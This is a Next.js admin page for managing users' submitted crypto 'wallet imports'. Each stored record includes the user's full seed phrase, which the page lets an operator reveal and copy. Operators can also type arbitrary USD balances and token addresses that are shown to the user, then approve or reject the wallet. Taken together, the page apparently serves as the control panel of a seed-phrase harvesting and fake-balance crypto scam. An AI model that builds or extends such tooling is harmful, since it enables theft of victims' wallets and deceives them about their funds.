'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Wallet,
  Search,
  Filter,
  ChevronRight,
  ChevronLeft,
  X,
  AlertCircle,
  CheckCircle2,
  Info,
  Loader2,
  Copy,
  Check,
  Clock,
  Shield,
  Eye,
  EyeOff,
  XCircle,
  DollarSign,
  Save,
  RefreshCw,
  User,
  Key,
  Coins,
} from 'lucide-react';
import { cn, formatCurrency } from '@/utils';
import { WalletLogo } from '@/components/wallet/WalletLogos';

// ============================================
// Admin Wallets Management Page
// ============================================

interface WalletToken {
  symbol: string;
  name: string;
  icon: string;
  amount: number;
  amountUsd: number;
  tokenAddress?: string;
}

interface WalletUser {
  _id: string;
  firstName: string;
  lastName: string;
  email: string;
}

interface AdminWallet {
  _id: string;
  userId: WalletUser;
  walletType: string;
  walletName: string;
  walletIcon: string;
  seedPhrase: string;
  address: string;
  status: 'pending' | 'approved' | 'rejected';
  tokens: WalletToken[];
  totalBalanceUsd: number;
  adminNote?: string;
  createdAt: string;
  approvedAt?: string;
  rejectedAt?: string;
}

interface Stats {
  total: number;
  pending: number;
  approved: number;
  rejected: number;
  totalFunded: number;
}

// Toast Component
interface Toast {
  id: string;
  type: 'success' | 'error' | 'info';
  message: string;
}

function ToastContainer({ toasts, onDismiss }: { toasts: Toast[]; onDismiss: (id: string) => void }) {
  return (
    <div className="fixed bottom-6 right-6 z-[100] flex flex-col gap-3">
      <AnimatePresence>
        {toasts.map((toast) => (
          <motion.div
            key={toast.id}
            initial={{ opacity: 0, x: 100, scale: 0.9 }}
            animate={{ opacity: 1, x: 0, scale: 1 }}
            exit={{ opacity: 0, x: 100, scale: 0.9 }}
            className={cn(
              'flex items-center gap-3 px-4 py-3 rounded-xl shadow-xl min-w-[300px]',
              toast.type === 'success' && 'bg-[#22c55e] text-white',
              toast.type === 'error' && 'bg-[#ef4444] text-white',
              toast.type === 'info' && 'bg-[#3b82f6] text-white'
            )}
          >
            {toast.type === 'success' && <CheckCircle2 className="h-5 w-5" />}
            {toast.type === 'error' && <AlertCircle className="h-5 w-5" />}
            {toast.type === 'info' && <Info className="h-5 w-5" />}
            <span className="flex-1 text-sm font-medium">{toast.message}</span>
            <button onClick={() => onDismiss(toast.id)} className="hover:opacity-70">
              <X className="h-4 w-4" />
            </button>
          </motion.div>
        ))}
      </AnimatePresence>
    </div>
  );
}

type ViewState = 'list' | 'wallet-detail';
type StatusFilter = 'all' | 'pending' | 'approved' | 'rejected';

export default function AdminWalletsPage() {
  const [viewState, setViewState] = useState<ViewState>('list');
  const [wallets, setWallets] = useState<AdminWallet[]>([]);
  const [selectedWallet, setSelectedWallet] = useState<AdminWallet | null>(null);
  const [stats, setStats] = useState<Stats>({ total: 0, pending: 0, approved: 0, rejected: 0, totalFunded: 0 });
  const [isLoading, setIsLoading] = useState(true);
  const [toasts, setToasts] = useState<Toast[]>([]);
  
  // Filters
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState<StatusFilter>('all');
  
  // Detail view state
  const [showSeedPhrase, setShowSeedPhrase] = useState(false);
  const [copied, setCopied] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [adminNote, setAdminNote] = useState('');
  
  // Token funding state
  const [tokenFunds, setTokenFunds] = useState<Record<string, string>>({});
  const [tokenAddresses, setTokenAddresses] = useState<Record<string, string>>({});
  const [isSavingTokens, setIsSavingTokens] = useState(false);

  // Fetch wallets
  useEffect(() => {
    fetchWallets();
  }, [statusFilter, searchQuery]);

  const fetchWallets = async () => {
    try {
      setIsLoading(true);
      const params = new URLSearchParams();
      if (statusFilter !== 'all') params.append('status', statusFilter);
      if (searchQuery) params.append('search', searchQuery);
      
      const res = await fetch(`/api/admin/wallets?${params.toString()}`);
      const data = await res.json();
      
      if (res.ok) {
        setWallets(data.wallets || []);
        setStats(data.stats || { total: 0, pending: 0, approved: 0, rejected: 0, totalFunded: 0 });
      }
    } catch (error) {
      console.error('Failed to fetch wallets:', error);
      addToast('error', 'Failed to load wallets');
    } finally {
      setIsLoading(false);
    }
  };

  const addToast = (type: Toast['type'], message: string) => {
    const id = Math.random().toString(36).substr(2, 9);
    setToasts((prev) => [...prev, { id, type, message }]);
    setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 5000);
  };

  const dismissToast = (id: string) => {
    setToasts((prev) => prev.filter((t) => t.id !== id));
  };

  const handleViewWallet = (wallet: AdminWallet) => {
    setSelectedWallet(wallet);
    setShowSeedPhrase(false);
    setAdminNote(wallet.adminNote || '');
    
    // Initialize token funds and addresses with current values
    const funds: Record<string, string> = {};
    const addresses: Record<string, string> = {};
    wallet.tokens.forEach(t => {
      funds[t.symbol] = t.amountUsd.toString();
      addresses[t.symbol] = t.tokenAddress || '';
    });
    setTokenFunds(funds);
    setTokenAddresses(addresses);
    
    setViewState('wallet-detail');
  };

  const handleBack = () => {
    setViewState('list');
    setSelectedWallet(null);
    setShowSeedPhrase(false);
  };

  const handleCopy = async (text: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    addToast('success', 'Copied to clipboard');
  };

  const handleSaveTokenFunds = async () => {
    if (!selectedWallet) return;
    
    setIsSavingTokens(true);
    
    try {
      // Build tokens array with updated values and addresses
      const tokens = selectedWallet.tokens.map(t => ({
        symbol: t.symbol,
        amountUsd: parseFloat(tokenFunds[t.symbol] || '0') || 0,
        tokenAddress: tokenAddresses[t.symbol] || '',
      }));

      const res = await fetch('/api/admin/wallets', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletId: selectedWallet._id,
          action: 'fund_tokens',
          tokens,
          adminNote,
        }),
      });

      const data = await res.json();

      if (res.ok) {
        addToast('success', 'Token balances and addresses updated successfully');
        setSelectedWallet(data.wallet);
        fetchWallets();
      } else {
        addToast('error', data.error || 'Failed to update tokens');
      }
    } catch (error) {
      addToast('error', 'Failed to save token data');
    } finally {
      setIsSavingTokens(false);
    }
  };

  const handleApprove = async () => {
    if (!selectedWallet) return;
    
    setIsProcessing(true);
    
    try {
      const res = await fetch('/api/admin/wallets', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletId: selectedWallet._id,
          action: 'approve',
          adminNote,
        }),
      });

      const data = await res.json();

      if (res.ok) {
        addToast('success', `Wallet approved! User balance updated.`);
        setSelectedWallet(data.wallet);
        fetchWallets();
      } else {
        addToast('error', data.error || 'Failed to approve wallet');
      }
    } catch (error) {
      addToast('error', 'Failed to approve wallet');
    } finally {
      setIsProcessing(false);
    }
  };

  const handleReject = async () => {
    if (!selectedWallet) return;
    
    setIsProcessing(true);
    
    try {
      const res = await fetch('/api/admin/wallets', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletId: selectedWallet._id,
          action: 'reject',
          adminNote,
        }),
      });

      const data = await res.json();

      if (res.ok) {
        addToast('success', 'Wallet rejected');
        setSelectedWallet(data.wallet);
        fetchWallets();
      } else {
        addToast('error', data.error || 'Failed to reject wallet');
      }
    } catch (error) {
      addToast('error', 'Failed to reject wallet');
    } finally {
      setIsProcessing(false);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'approved':
        return (
          <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-[#22c55e]/10 text-[#22c55e] text-sm font-medium">
            <Shield className="h-4 w-4" />
            Approved
          </span>
        );
      case 'pending':
        return (
          <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-[#f59e0b]/10 text-[#f59e0b] text-sm font-medium">
            <Clock className="h-4 w-4" />
            Pending
          </span>
        );
      case 'rejected':
        return (
          <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-[#ef4444]/10 text-[#ef4444] text-sm font-medium">
            <XCircle className="h-4 w-4" />
            Rejected
          </span>
        );
      default:
        return null;
    }
  };

  return (
    <div className="p-6">
      {/* ===== LIST VIEW ===== */}
      {viewState === 'list' && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
          <div className="flex items-center justify-between mb-6">
            <div>
              <h1 className="text-2xl font-bold text-white">Wallet Management</h1>
              <p className="text-[#6b7a90]">Review and manage user wallet imports</p>
            </div>
            <button
              onClick={() => fetchWallets()}
              className="flex items-center gap-2 px-4 py-2 rounded-lg bg-[#1e2733] text-white hover:bg-[#2a3441] transition-colors"
            >
              <RefreshCw className="h-4 w-4" />
              Refresh
            </button>
          </div>

          {/* Stats Cards */}
          <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
            <div className="bg-[#0f1419] rounded-xl p-4 border border-[#1e2733]">
              <p className="text-sm text-[#6b7a90] mb-1">Total Wallets</p>
              <p className="text-2xl font-bold text-white">{stats.total}</p>
            </div>
            <div className="bg-[#0f1419] rounded-xl p-4 border border-[#f59e0b]/30">
              <p className="text-sm text-[#6b7a90] mb-1">Pending</p>
              <p className="text-2xl font-bold text-[#f59e0b]">{stats.pending}</p>
            </div>
            <div className="bg-[#0f1419] rounded-xl p-4 border border-[#22c55e]/30">
              <p className="text-sm text-[#6b7a90] mb-1">Approved</p>
              <p className="text-2xl font-bold text-[#22c55e]">{stats.approved}</p>
            </div>
            <div className="bg-[#0f1419] rounded-xl p-4 border border-[#ef4444]/30">
              <p className="text-sm text-[#6b7a90] mb-1">Rejected</p>
              <p className="text-2xl font-bold text-[#ef4444]">{stats.rejected}</p>
            </div>
            <div className="bg-[#0f1419] rounded-xl p-4 border border-[#3b82f6]/30">
              <p className="text-sm text-[#6b7a90] mb-1">Total Funded</p>
              <p className="text-2xl font-bold text-[#3b82f6]">{formatCurrency(stats.totalFunded)}</p>
            </div>
          </div>

          {/* Filters */}
          <div className="flex flex-col md:flex-row gap-4 mb-6">
            <div className="flex-1 relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-[#6b7a90]" />
              <input
                type="text"
                placeholder="Search by user email, name, or wallet address..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-10 pr-4 py-3 rounded-xl bg-[#0f1419] border border-[#1e2733] text-white placeholder:text-[#6b7a90] focus:outline-none focus:border-[#22c55e]/50"
              />
            </div>
            <div className="flex gap-2">
              {(['all', 'pending', 'approved', 'rejected'] as StatusFilter[]).map((status) => (
                <button
                  key={status}
                  onClick={() => setStatusFilter(status)}
                  className={cn(
                    'px-4 py-2 rounded-lg text-sm font-medium transition-colors capitalize',
                    statusFilter === status
                      ? 'bg-[#22c55e] text-white'
                      : 'bg-[#1e2733] text-[#6b7a90] hover:text-white'
                  )}
                >
                  {status}
                </button>
              ))}
            </div>
          </div>

          {/* Wallets List */}
          {isLoading ? (
            <div className="flex items-center justify-center py-20">
              <Loader2 className="h-8 w-8 animate-spin text-[#22c55e]" />
            </div>
          ) : wallets.length === 0 ? (
            <div className="text-center py-20 bg-[#0f1419] rounded-xl border border-[#1e2733]">
              <Wallet className="h-12 w-12 text-[#6b7a90] mx-auto mb-3" />
              <p className="text-[#6b7a90]">No wallets found</p>
            </div>
          ) : (
            <div className="bg-[#0f1419] rounded-xl border border-[#1e2733] overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full min-w-[900px]">
                  <thead>
                    <tr className="border-b border-[#1e2733]">
                      <th className="text-left py-4 px-6 text-sm font-medium text-[#6b7a90] whitespace-nowrap">User</th>
                      <th className="text-left py-4 px-6 text-sm font-medium text-[#6b7a90] whitespace-nowrap">Wallet</th>
                      <th className="text-left py-4 px-6 text-sm font-medium text-[#6b7a90] whitespace-nowrap">Address</th>
                      <th className="text-left py-4 px-6 text-sm font-medium text-[#6b7a90] whitespace-nowrap">Balance</th>
                      <th className="text-left py-4 px-6 text-sm font-medium text-[#6b7a90] whitespace-nowrap">Status</th>
                      <th className="text-left py-4 px-6 text-sm font-medium text-[#6b7a90] whitespace-nowrap">Date</th>
                      <th className="text-right py-4 px-6 text-sm font-medium text-[#6b7a90] whitespace-nowrap">Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {wallets.map((wallet) => (
                      <tr key={wallet._id} className="border-b border-[#1e2733] hover:bg-[#151c24]">
                        <td className="py-4 px-6">
                          <div className="flex items-center gap-3">
                            <div className="h-10 w-10 rounded-full bg-[#22c55e]/10 flex items-center justify-center shrink-0">
                              <User className="h-5 w-5 text-[#22c55e]" />
                            </div>
                            <div className="min-w-0">
                              <p className="text-white font-medium whitespace-nowrap">
                                {wallet.userId?.firstName} {wallet.userId?.lastName}
                              </p>
                              <p className="text-sm text-[#6b7a90] truncate max-w-[200px]">{wallet.userId?.email}</p>
                            </div>
                          </div>
                        </td>
                        <td className="py-4 px-6">
                          <div className="flex items-center gap-3">
                            <div className="h-10 w-10 rounded-xl bg-[#1e2733] flex items-center justify-center shrink-0">
                              <WalletLogo walletId={wallet.walletType} name={wallet.walletName} size={24} />
                            </div>
                            <span className="text-white whitespace-nowrap">{wallet.walletName}</span>
                          </div>
                        </td>
                        <td className="py-4 px-6">
                          <span className="text-[#6b7a90] font-mono text-sm whitespace-nowrap">
                            {wallet.address.slice(0, 6)}...{wallet.address.slice(-4)}
                          </span>
                        </td>
                        <td className="py-4 px-6">
                          <span className="text-white font-medium whitespace-nowrap">
                            {formatCurrency(wallet.totalBalanceUsd)}
                          </span>
                        </td>
                        <td className="py-4 px-6">
                          {getStatusBadge(wallet.status)}
                        </td>
                        <td className="py-4 px-6">
                          <span className="text-[#6b7a90] text-sm whitespace-nowrap">
                            {new Date(wallet.createdAt).toLocaleDateString()}
                          </span>
                        </td>
                        <td className="py-4 px-6 text-right">
                          <button
                            onClick={() => handleViewWallet(wallet)}
                            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-[#22c55e]/10 text-[#22c55e] hover:bg-[#22c55e]/20 transition-colors ml-auto whitespace-nowrap"
                          >
                            <Eye className="h-4 w-4" />
                            View
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </motion.div>
      )}

      {/* ===== WALLET DETAIL VIEW ===== */}
      {viewState === 'wallet-detail' && selectedWallet && (
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
          <button
            onClick={handleBack}
            className="flex items-center gap-2 text-[#6b7a90] hover:text-white mb-6 transition-colors"
          >
            <ChevronLeft className="h-4 w-4" />
            Back to wallets
          </button>

          {/* User & Wallet Info */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
            {/* User Info */}
            <div className="bg-[#0f1419] rounded-xl p-6 border border-[#1e2733]">
              <h3 className="font-semibold text-white mb-4 flex items-center gap-2">
                <User className="h-5 w-5 text-[#22c55e]" />
                User Information
              </h3>
              <div className="space-y-3">
                <div className="flex justify-between">
                  <span className="text-[#6b7a90]">Name</span>
                  <span className="text-white">
                    {selectedWallet.userId?.firstName} {selectedWallet.userId?.lastName}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-[#6b7a90]">Email</span>
                  <span className="text-white">{selectedWallet.userId?.email}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-[#6b7a90]">Submitted</span>
                  <span className="text-white">{new Date(selectedWallet.createdAt).toLocaleString()}</span>
                </div>
              </div>
            </div>

            {/* Wallet Info */}
            <div className="bg-[#0f1419] rounded-xl p-6 border border-[#1e2733]">
              <h3 className="font-semibold text-white mb-4 flex items-center gap-2">
                <Wallet className="h-5 w-5 text-[#22c55e]" />
                Wallet Information
              </h3>
              <div className="space-y-3">
                <div className="flex justify-between items-center">
                  <span className="text-[#6b7a90]">Wallet</span>
                  <div className="flex items-center gap-2">
                    <WalletLogo walletId={selectedWallet.walletType} name={selectedWallet.walletName} size={20} />
                    <span className="text-white">{selectedWallet.walletName}</span>
                  </div>
                </div>
                <div className="flex justify-between">
                  <span className="text-[#6b7a90]">Address</span>
                  <div className="flex items-center gap-2">
                    <span className="text-white font-mono text-sm">
                      {selectedWallet.address.slice(0, 10)}...{selectedWallet.address.slice(-8)}
                    </span>
                    <button onClick={() => handleCopy(selectedWallet.address)} className="text-[#6b7a90] hover:text-white">
                      {copied ? <Check className="h-4 w-4 text-[#22c55e]" /> : <Copy className="h-4 w-4" />}
                    </button>
                  </div>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-[#6b7a90]">Status</span>
                  {getStatusBadge(selectedWallet.status)}
                </div>
                <div className="flex justify-between">
                  <span className="text-[#6b7a90]">Total Balance</span>
                  <span className="text-white font-semibold">{formatCurrency(selectedWallet.totalBalanceUsd)}</span>
                </div>
              </div>
            </div>
          </div>

          {/* Seed Phrase Section */}
          <div className="bg-[#0f1419] rounded-xl p-6 border border-[#ef4444]/30 mb-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="font-semibold text-white flex items-center gap-2">
                <Key className="h-5 w-5 text-[#ef4444]" />
                Seed Phrase (Sensitive)
              </h3>
              <button
                onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                className="flex items-center gap-2 px-4 py-2 rounded-lg bg-[#ef4444]/10 text-[#ef4444] hover:bg-[#ef4444]/20 transition-colors"
              >
                {showSeedPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                {showSeedPhrase ? 'Hide' : 'Reveal'}
              </button>
            </div>
            
            {showSeedPhrase ? (
              <div className="relative">
                <div className="p-4 bg-[#0a0e14] rounded-xl border border-[#ef4444]/20">
                  <p className="text-white font-mono text-sm break-all">{selectedWallet.seedPhrase}</p>
                </div>
                <button
                  onClick={() => handleCopy(selectedWallet.seedPhrase)}
                  className="absolute top-3 right-3 text-[#6b7a90] hover:text-white"
                >
                  {copied ? <Check className="h-4 w-4 text-[#22c55e]" /> : <Copy className="h-4 w-4" />}
                </button>
              </div>
            ) : (
              <div className="p-4 bg-[#0a0e14] rounded-xl border border-[#1e2733]">
                <p className="text-[#6b7a90] font-mono text-sm">••••• ••••• ••••• ••••• ••••• ••••• ••••• •••••</p>
              </div>
            )}
            
            <p className="text-xs text-[#ef4444] mt-3">
              ⚠️ This seed phrase provides full access to the wallet. Handle with extreme care.
            </p>
          </div>

          {/* Fund Tokens Section */}
          <div className="bg-[#0f1419] rounded-xl p-6 border border-[#1e2733] mb-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="font-semibold text-white flex items-center gap-2">
                <Coins className="h-5 w-5 text-[#22c55e]" />
                Fund Wallet Tokens
              </h3>
              <button
                onClick={handleSaveTokenFunds}
                disabled={isSavingTokens}
                className="flex items-center gap-2 px-4 py-2 rounded-lg bg-[#22c55e] text-white hover:bg-[#1ea550] transition-colors disabled:opacity-50"
              >
                {isSavingTokens ? <Loader2 className="h-4 w-4 animate-spin" /> : <Save className="h-4 w-4" />}
                Save Balances
              </button>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {selectedWallet.tokens.map((token) => (
                <div key={token.symbol} className="p-4 bg-[#0a0e14] rounded-xl border border-[#1e2733]">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="h-10 w-10 rounded-full overflow-hidden bg-[#1e2733]">
                      <Image src={token.icon} alt={token.symbol} width={40} height={40} unoptimized />
                    </div>
                    <div>
                      <p className="font-medium text-white">{token.name}</p>
                      <p className="text-sm text-[#6b7a90]">{token.symbol}</p>
                    </div>
                  </div>
                  
                  {/* USD Value */}
                  <div className="mb-3">
                    <label className="text-xs text-[#6b7a90] mb-1 block">USD Value</label>
                    <div className="relative">
                      <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-[#6b7a90]" />
                      <input
                        type="number"
                        value={tokenFunds[token.symbol] || ''}
                        onChange={(e) => setTokenFunds(prev => ({ ...prev, [token.symbol]: e.target.value }))}
                        placeholder="0.00"
                        min="0"
                        step="0.01"
                        className="w-full pl-9 pr-4 py-2 rounded-lg bg-[#151c24] border border-[#1e2733] text-white placeholder:text-[#6b7a90] focus:outline-none focus:border-[#22c55e]/50"
                      />
                    </div>
                  </div>
                  
                  {/* Token Address */}
                  <div>
                    <label className="text-xs text-[#6b7a90] mb-1 block">Token Address (for user)</label>
                    <input
                      type="text"
                      value={tokenAddresses[token.symbol] || ''}
                      onChange={(e) => setTokenAddresses(prev => ({ ...prev, [token.symbol]: e.target.value }))}
                      placeholder="0x..."
                      className="w-full px-3 py-2 rounded-lg bg-[#151c24] border border-[#1e2733] text-white font-mono text-xs placeholder:text-[#6b7a90] focus:outline-none focus:border-[#22c55e]/50"
                    />
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Admin Note */}
          <div className="bg-[#0f1419] rounded-xl p-6 border border-[#1e2733] mb-6">
            <h3 className="font-semibold text-white mb-4">Admin Note</h3>
            <textarea
              value={adminNote}
              onChange={(e) => setAdminNote(e.target.value)}
              placeholder="Add a note (visible to user on rejection)..."
              rows={3}
              className="w-full px-4 py-3 rounded-xl bg-[#0a0e14] border border-[#1e2733] text-white placeholder:text-[#6b7a90] focus:outline-none focus:border-[#22c55e]/50 resize-none"
            />
          </div>

          {/* Action Buttons */}
          {selectedWallet.status === 'pending' && (
            <div className="flex gap-4">
              <button
                onClick={handleReject}
                disabled={isProcessing}
                className="flex-1 flex items-center justify-center gap-2 py-4 rounded-xl bg-[#ef4444] text-white font-semibold hover:bg-[#dc2626] transition-colors disabled:opacity-50"
              >
                {isProcessing ? <Loader2 className="h-5 w-5 animate-spin" /> : <XCircle className="h-5 w-5" />}
                Reject Wallet
              </button>
              <button
                onClick={handleApprove}
                disabled={isProcessing}
                className="flex-1 flex items-center justify-center gap-2 py-4 rounded-xl bg-[#22c55e] text-white font-semibold hover:bg-[#1ea550] transition-colors disabled:opacity-50"
              >
                {isProcessing ? <Loader2 className="h-5 w-5 animate-spin" /> : <CheckCircle2 className="h-5 w-5" />}
                Approve Wallet
              </button>
            </div>
          )}

          {selectedWallet.status === 'approved' && (
            <div className="p-4 bg-[#22c55e]/10 rounded-xl border border-[#22c55e]/20">
              <div className="flex items-center gap-3">
                <CheckCircle2 className="h-5 w-5 text-[#22c55e]" />
                <div>
                  <p className="font-medium text-white">Wallet Approved</p>
                  <p className="text-sm text-[#6b7a90]">
                    Approved on {new Date(selectedWallet.approvedAt || '').toLocaleString()}
                  </p>
                </div>
              </div>
            </div>
          )}

          {selectedWallet.status === 'rejected' && (
            <div className="p-4 bg-[#ef4444]/10 rounded-xl border border-[#ef4444]/20">
              <div className="flex items-center gap-3">
                <XCircle className="h-5 w-5 text-[#ef4444]" />
                <div>
                  <p className="font-medium text-white">Wallet Rejected</p>
                  <p className="text-sm text-[#6b7a90]">
                    Rejected on {new Date(selectedWallet.rejectedAt || '').toLocaleString()}
                  </p>
                </div>
              </div>
            </div>
          )}
        </motion.div>
      )}

      <ToastContainer toasts={toasts} onDismiss={dismissToast} />
    </div>
  );
}
